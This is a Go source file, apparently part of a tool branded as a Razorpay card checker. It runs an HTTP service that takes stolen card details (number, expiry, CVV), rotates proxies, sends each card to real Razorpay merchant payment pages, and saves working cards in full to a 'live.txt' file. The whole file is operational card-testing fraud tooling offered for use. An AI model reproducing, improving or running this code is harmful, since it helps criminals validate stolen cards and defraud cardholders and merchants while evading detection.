// ClearOutputFiles clears all output files
func clearOutputFiles() {
    files := []string{OutputLive, OutputDeclined, Output3DS, OutputUnknown, OutputDebug}
    for _, f := range files {
        if file, err := os.Create(f); err == nil {
            file.Close()
        }
    }
}

var proxyErrorKeywords = []string{
    "ECONNREFUSED", "ECONNRESET", "ETIMEDOUT", "ENOTFOUND",
    "CURLE_COULDNT_RESOLVE_PROXY", "CURLE_COULDNT_CONNECT",
    "CURLE_OPERATION_TIMEOUTED", "CURLE_PROXY",
    "socket hang up", "HPE_INVALID", "fetch failed",
    "no such host", "connection refused", "connection reset",
    "i/o timeout", "timeout", "proxyconnect",
}

func makeProxyError(err error, proxyURL string) CheckResult {
    msg := truncate(err.Error(), 120)
    msgUpper := strings.ToUpper(msg)
    isProxyErr := false
    for _, k := range proxyErrorKeywords {
        if strings.Contains(msgUpper, strings.ToUpper(k)) {
            isProxyErr = true
            break
        }
    }
    status := "LIVE"
    if isProxyErr {
        status = "DEAD"
    }
    return CheckResult{Status: "error", Message: msg, Proxy: proxyURL, ProxyStatus: status}
}

func maskProxy(proxyURL, proxyStatus string) string {
    if proxyURL == "" {
        return "DIRECT [" + proxyStatus + "]"
    }
    parsed, err := url.Parse(proxyURL)
    if err == nil && parsed.Host != "" {
        return parsed.Scheme + "//" + parsed.Host + " [" + proxyStatus + "]"
    }
    masked := regexp.MustCompile(`//[^@]+@`).ReplaceAllString(proxyURL, "//***@")
    return masked + " [" + proxyStatus + "]"
}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

type ParsedCard struct {
    CC, MM, YY, CVV string
}

func parseCard(cardData string) (*ParsedCard, error) {
    cardData = strings.TrimSpace(cardData)
    separators := []string{"|", "/", " "}

    for _, sep := range separators {
        parts := strings.Split(cardData, sep)
        if len(parts) >= 4 {
            cc := strings.TrimSpace(parts[0])
            mm := strings.TrimSpace(parts[1])
            yy := strings.TrimSpace(parts[2])
            cvv := strings.TrimSpace(parts[3])

            if isDigits(cc) && isDigitsMM(mm) && isDigitsYY(yy) && isDigitsCVV(cvv) {
                mmInt, _ := strconv.Atoi(mm)
                if len(cc) >= 13 && len(cc) <= 19 && mmInt >= 1 && mmInt <= 12 {
                    return &ParsedCard{
                        CC:  cc,
                        MM:  fmt.Sprintf("%02d", mmInt),
                        YY:  yy,
                        CVV: cvv,
                    }, nil
                }
            }
        }
    }
    return nil, errors.New("invalid card format")
}

func isDigits(s string) bool {
    for _, c := range s {
        if c < '0' || c > '9' {
            return false
        }
    }
    return len(s) > 0
}

func isDigitsMM(s string) bool {
    return isDigits(s) && (len(s) == 1 || len(s) == 2)
}

func isDigitsYY(s string) bool {
    return isDigits(s) && (len(s) == 2 || len(s) == 4)
}

func isDigitsCVV(s string) bool {
    return isDigits(s) && (len(s) == 3 || len(s) == 4)
}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

func extractMerchantFromURL(targetURL string) string {
    if strings.Contains(targetURL, "razorpay.me/") {
        parts := strings.Split(targetURL, "@")
        if len(parts) > 1 {
            return strings.TrimSuffix(parts[1], "/")
        }
    }
    return "unknown"
}

func logLive(card *ParsedCard, result CheckResult, targetURL string) {
    merchantName := extractMerchantFromURL(targetURL)

    if result.Status == "charged" || result.Status == "approved" {
        line := fmt.Sprintf("%s|%s|%s|%s — %s — %s | Site: %s\n",
            card.CC, card.MM, card.YY, card.CVV, result.Status, result.Message, merchantName)
        f, err := os.OpenFile("live.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        if err == nil {
            f.WriteString(line)
            f.Close()
            log.Printf("[SAVED] Live card to live.txt: %s", line)
        } else {
            log.Printf("[ERROR] live.txt: %v", err)
        }
        log.Printf("[LIVE] Card: %s|%s|%s|%s - %s - %s @ %s",
            card.CC[:6]+"******"+card.CC[len(card.CC)-4:], card.MM, card.YY, card.CVV, result.Status, result.Message, merchantName)
    } else {
        // Log declined too
        line := fmt.Sprintf("%s|%s|%s|%s — %s — %s | Site: %s\n",
            card.CC, card.MM, card.YY, card.CVV, result.Status, result.Message, merchantName)
        f, err := os.OpenFile("declined.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        if err == nil {
            f.WriteString(line)
            f.Close()
            log.Printf("[SAVED] Declined card to declined.txt: %s", line)
        } else {
            log.Printf("[ERROR] declined.txt: %v", err)
        }
        log.Printf("[CHECK] Card: %s|%s|%s|%s - %s - %s @ %s",
            card.CC[:6]+"******"+card.CC[len(card.CC)-4:], card.MM, card.YY, card.CVV, result.Status, result.Message, merchantName)
    }
}

func logResult(card *ParsedCard, result CheckResult, proxyDisplay, targetURL string) {
    first6 := card.CC
    if len(first6) > 6 {
        first6 = first6[:6]
    }
    last4 := card.CC
    if len(last4) > 4 {
        last4 = last4[len(last4)-4:]
    }
    middle := strings.Repeat("*", len(card.CC)-10)
    if len(middle) < 6 {
        middle = "******"
    }
    log.Printf("[%s] %s%s%s | %s | %s | Site: %s",
        strings.ToUpper(result.Status), first6, middle, last4,
        result.Message, proxyDisplay, targetURL)
}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

func handler(w http.ResponseWriter, r *http.Request) {
    w.Header().Set("Content-Type", "application/json")

    path := r.URL.Path

    // Check for results endpoint
    if path == "/razorpay/results" || path == "/results" {
        results := readOutputFiles()
        json.NewEncoder(w).Encode(map[string]string{
            "status":   "ok",
            "response": results,
        })
        return
    }

    // Check for debug log endpoint
    if path == "/razorpay/debug" || path == "/debug" {
        if data, err := os.ReadFile(OutputDebug); err == nil {
            json.NewEncoder(w).Encode(map[string]string{
                "status":   "ok",
                "response": string(data),
            })
        } else {
            json.NewEncoder(w).Encode(map[string]string{
                "status":   "ok",
                "response": "No debug logs yet",
            })
        }
        return
    }

    // Check for clear endpoint
    if path == "/razorpay/clear" || path == "/clear" {
        clearOutputFiles()
        json.NewEncoder(w).Encode(map[string]string{
            "status":   "ok",
            "response": "All output files cleared",
        })
        return
    }

    // Check for stats endpoint
    if path == "/razorpay/stats" || path == "/stats" {
        json.NewEncoder(w).Encode(map[string]interface{}{
            "status":       "ok",
            "response":    showLiveStats(),
            "total":      atomic.LoadUint64(&stats.totalCards),
            "processed": atomic.LoadUint64(&stats.processed),
            "live":      atomic.LoadUint64(&stats.liveCount),
            "declined":  atomic.LoadUint64(&stats.declined),
            "threeds":   atomic.LoadUint64(&stats.threeds),
            "unknown":   atomic.LoadUint64(&stats.unknown),
            "invalid":   atomic.LoadUint64(&stats.invalid),
        })
        return
    }

    // Check for init endpoint
    if path == "/razorpay/init" || path == "/init" {
        initOutputFiles()
        json.NewEncoder(w).Encode(map[string]string{
            "status":   "ok",
            "response": "Output files initialized",
        })
        return
    }

    // Check for single card check
    re := regexp.MustCompile(`^/razorpay/cc=(.+)$`)
    match := re.FindStringSubmatch(path)

    if len(match) < 2 {
        w.WriteHeader(http.StatusNotFound)
        json.NewEncoder(w).Encode(map[string]string{
            "status":   "error",
            "response": "Invalid endpoint. Use: /razorpay/cc={cc|mm|yy|cvv}",
            "proxy":    "N/A",
        })
        return
    }

    cardData, _ := url.QueryUnescape(match[1])
    card, err := parseCard(cardData)
    if err != nil {
        w.WriteHeader(http.StatusBadRequest)
        json.NewEncoder(w).Encode(map[string]string{
            "status":   "error",
            "response": "Invalid card format. Use: cc|mm|yy|cvv",
            "proxy":    "N/A",
        })
        return
    }

    proxyList := loadProxies("px.txt")
    proxy := getNextProxy(proxyList)
    targetURL := getNextURL()

    result := checkCard(card.CC, card.MM, card.YY, card.CVV, proxy, targetURL)

    proxyDisplay := maskProxy(result.Proxy, result.ProxyStatus)
    logLive(card, result, targetURL)
    logResult(card, result, proxyDisplay, targetURL)

    resp := map[string]string{
        "status":   result.Status,
        "response": result.Message,
        "proxy":    proxyDisplay,
    }

    if result.Status == "error" {
        w.WriteHeader(http.StatusInternalServerError)
    } else {
        w.WriteHeader(http.StatusOK)
    }
    json.NewEncoder(w).Encode(resp)
}

// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────

func main() {
    log.SetFlags(log.Ldate | log.Ltime)

    // Initialize output files
    initOutputFiles()

    http.HandleFunc("/", handler)

    port := getPort()
    addr := fmt.Sprintf("0.0.0.0:%d", port)
    log.Printf("=========================================================")
    log.Printf("  🪙 RAZORPAY CARD CHECKER - GO VERSION (ENHANCED)")
    log.Printf("  Listening on: http://%s", addr)
    log.Printf("=========================================================")
    log.Printf("  Endpoints:")
    log.Printf("    /razorpay/cc=CC|MM|YY|CVV  - Check single card")
    log.Printf("    /razorpay/results          - View results")
    log.Printf("    /razorpay/stats           - View statistics")
    log.Printf("    /razorpay/debug          - View debug log")
    log.Printf("    /razorpay/clear          - Clear all outputs")
    log.Printf("    /razorpay/init           - Initialize output files")
    log.Printf("=========================================================")
    log.Printf("  VPA: %s (configurable via RZP_VPA env)", configuredVPA)
    log.Printf("  Key: %s", getKeyID())
    log.Printf("=========================================================")

    if err := http.ListenAndServe(addr, nil); err != nil {
        log.Fatalf("Server failed: %v", err)
    }
}


// ──────────────────────────────────────────────────────────────────────────────
//  AUTO RAZORPAY BY @rnrxx / @ccnfy - DAD OF TREX
// ──────────────────────────────────────────────────────────────────────────────
